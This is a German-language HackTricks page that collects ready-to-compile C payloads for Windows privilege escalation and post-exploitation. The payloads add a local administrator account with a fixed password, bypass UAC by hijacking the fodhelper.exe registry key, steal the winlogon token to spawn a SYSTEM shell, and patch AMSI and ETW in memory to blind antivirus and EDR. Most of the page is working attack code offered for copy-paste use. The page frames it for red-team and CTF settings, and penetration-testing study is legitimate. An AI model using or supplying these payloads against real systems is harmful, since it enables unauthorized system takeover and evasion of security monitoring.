# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Diese Seite sammelt **kleine, eigenständige C-Snippets**, die während der Windows Local Privilege Escalation oder Post-Exploitation nützlich sind. Jedes Payload ist so gestaltet, dass es **copy-paste-freundlich** ist, benötigt nur die Windows API / C-Laufzeit und kann mit `i686-w64-mingw32-gcc` (x86) oder `x86_64-w64-mingw32-gcc` (x64) kompiliert werden.

> ⚠️  Diese Payloads setzen voraus, dass der Prozess bereits über die minimalen Berechtigungen verfügt, die erforderlich sind, um die Aktion auszuführen (z. B. `SeDebugPrivilege`, `SeImpersonatePrivilege` oder Kontext mit mittlerer Integrität für einen UAC-Bypass). Sie sind für **Red-Team- oder CTF-Einstellungen** gedacht, in denen das Ausnutzen einer Schwachstelle zur Ausführung beliebigen nativen Codes geführt hat.

---

## Lokalen Administratorbenutzer hinzufügen
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Wenn die vertrauenswürdige Binärdatei **`fodhelper.exe`** ausgeführt wird, fragt sie den folgenden Registrierungspfad **ohne das `DelegateExecute`-Verb zu filtern**. Indem wir unseren Befehl unter diesem Schlüssel platzieren, kann ein Angreifer UAC *ohne* das Ablegen einer Datei auf der Festplatte umgehen.

*Registry path queried by `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Ein minimales PoC, das ein erhöhtes `cmd.exe` öffnet:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Getestet auf Windows 10 22H2 und Windows 11 23H2 (Juli 2025 Patches). Der Bypass funktioniert weiterhin, da Microsoft die fehlende Integritätsprüfung im `DelegateExecute`-Pfad nicht behoben hat.*

---

## SYSTEM-Shell über Token-Duplikation erzeugen (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Wenn der aktuelle Prozess **beide** Privilegien `SeDebug` und `SeImpersonate` hält (typisch für viele Dienstkonten), können Sie das Token von `winlogon.exe` stehlen, es duplizieren und einen erhöhten Prozess starten:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Für eine tiefere Erklärung, wie das funktioniert, siehe:
{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Abwehrumgehung)
Die meisten modernen AV/EDR-Engines verlassen sich auf **AMSI** und **ETW**, um bösartiges Verhalten zu inspizieren. Das Patchen beider Schnittstellen früh im aktuellen Prozess verhindert, dass skriptbasierte Payloads (z. B. PowerShell, JScript) gescannt werden.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Der oben genannte Patch ist prozesslokal; das Starten eines neuen PowerShell nach dessen Ausführung erfolgt ohne AMSI/ETW-Inspektion.*

---

## Referenzen
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: Der kleinste Patch ist immer noch ausreichend” (BlackHat Asia 2023)

{{#include ../../banners/hacktricks-training.md}}
